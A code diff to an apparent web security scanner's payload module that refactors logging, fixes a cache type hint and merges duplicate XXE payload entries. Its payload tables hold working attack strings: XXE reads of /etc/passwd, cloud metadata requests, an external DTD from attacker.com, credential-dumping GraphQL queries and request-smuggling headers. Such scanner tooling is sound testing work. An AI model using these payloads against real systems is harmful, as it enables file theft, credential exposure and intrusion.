@@ -1,8 +1,8 @@
 from __future__ import annotations
 import logging
-import os, json, re, subprocess, shlex, time, threading
+import os, json, re, subprocess, shlex, threading
 from pathlib import Path
-from typing import List, Iterable, Dict, Any, Tuple, Set
+from typing import List, Iterable, Dict, Any
 
 _logger = logging.getLogger(__name__)
 
@@ -47,12 +47,10 @@ def _read_lines(path: Path) -> list[str]:
     try:
         txt = path.read_text(encoding='utf-8', errors='ignore')
     except PermissionError:
-        import logging as _log
-        _log.getLogger(__name__).warning(f"[payloads] Permission denied reading wordlist: {path}")
+        _logger.warning("[payloads] Permission denied reading wordlist: %s", path)
         return []
     except OSError as _e:
-        import logging as _log
-        _log.getLogger(__name__).error(f"[payloads] Cannot read wordlist {path}: {_e!r}")
+        _logger.error("[payloads] Cannot read wordlist %s: %r", path, _e)
         return []
     out: list[str] = []
     for line in txt.splitlines():
@@ -316,7 +314,7 @@ def load_external_payloads(category: str, marker: str | None = None) -> list[str
     # Kategori doğrulamasını esnet: bilinmeyen kategoride de config'e verilmiş pattern'ler kullanılabilir.
     cfg = _load_cfg()
     pl_cfg = (cfg.get("payloads") or {}) if isinstance(cfg, dict) else {}
-    if pl_cfg is False or not isinstance(pl_cfg, dict):
+    if not isinstance(pl_cfg, dict):
         return []
 
     # Tek provider: bundled (tüm wordlistler websecure/wordlists/ altında)
@@ -426,11 +424,11 @@ ALLOWED_CATEGORIES = {
     "smuggling",
 }
 
-_PAYLOAD_CACHE: dict[tuple[str, str | None, tuple[str, None] | None], list[str]] = {}
+_PAYLOAD_CACHE: dict[tuple[str, str | None, tuple[str, ...] | None], list[str]] = {}
 _PAYLOAD_CACHE_LOCK = threading.Lock()
 
 def _cache_key(category: str, marker: str | None, tech_tags: Iterable[str] | None) -> tuple[
-    str, str | None, tuple[str, None] | None]:
+    str, str | None, tuple[str, ...] | None]:
     return (category, marker, tuple(sorted([t for t in (tech_tags or []) if t])) or None)
 
 def url_encode_twice(s: str) -> str:
@@ -530,6 +528,9 @@ BUILTIN_PAYLOADS = {
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///windows/win.ini\">]><root>&xxe;</root>",
         "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
         "<?xml version=\"1.0\"?><foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\" parse=\"text\"/></foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
+        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
     ],
     "ssti": [
         "{{7*7}}",
@@ -639,12 +640,6 @@ BUILTIN_PAYLOADS = {
         "{\"query\": \"{ __type(name: \\\"User\\\") { fields { name } } }\"}",
         "{\"query\": \"mutation { createUser(username: \\\"admin\\\", role: \\\"admin\\\") { id } }\"}",
         "{\"query\": \"{ user(id: 1) { id username password apiKey } }\"}",
-    ],
-    "xxe": [
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo/>",
-        "<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file:///etc/passwd\"/></foo>",
-        "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
     ],
     "http_smuggling": [
         "Content-Length: 0\r\nTransfer-Encoding: chunked",
